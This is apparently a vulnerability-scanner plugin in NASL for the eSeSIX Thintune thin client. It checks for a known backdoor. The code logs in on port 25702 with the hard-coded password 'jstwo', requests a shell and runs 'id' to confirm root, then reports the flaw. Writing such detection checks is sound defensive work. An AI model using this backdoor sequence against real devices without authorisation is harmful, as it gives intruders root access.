if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.13839" );
	script_version( "2019-09-07T12:21:55+0000" );
	script_cve_id( "CVE-2004-2048", "CVE-2004-2049", "CVE-2004-2050", "CVE-2004-2051" );
	script_bugtraq_id( 10794 );
	script_tag( name: "last_modification", value: "2019-09-07 12:21:55 +0000 (Sat, 07 Sep 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "eSeSIX Thintune Thin Client Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "This script is Copyright (C) 2004 Noam Rathaus" );
	script_family( "Default Accounts" );
	script_dependencies( "find_service2.sc", "gb_default_credentials_options.sc" );
	script_require_ports( 25702 );
	script_exclude_keys( "default_credentials/disable_default_account_checks" );
	script_tag( name: "summary", value: "Multiple security vulnerabilities have been found in Thintune,
  one of them is a backdoor password ('jstwo') allowing complete access to the system." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
port = 25702;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
res = recv_line( socket: soc, length: 1024 );
if(ContainsString( res, "JSRAFV-1" )){
	req = "jstwo\\n";
	send( socket: soc, data: req );
	res = recv_line( socket: soc, length: 1024 );
	if(ContainsString( res, "+yep" )){
		req = "shell\\n";
		send( socket: soc, data: req );
		res = recv_line( socket: soc, length: 1024 );
		if(ContainsString( res, "+yep here you are" )){
			req = "id\\n";
			send( socket: soc, data: req );
			res = recv( socket: soc, length: 1024 );
			if(ContainsString( res, "uid=0" )){
				security_message( port: port );
			}
		}
	}
}
close( soc );
exit( 0 );

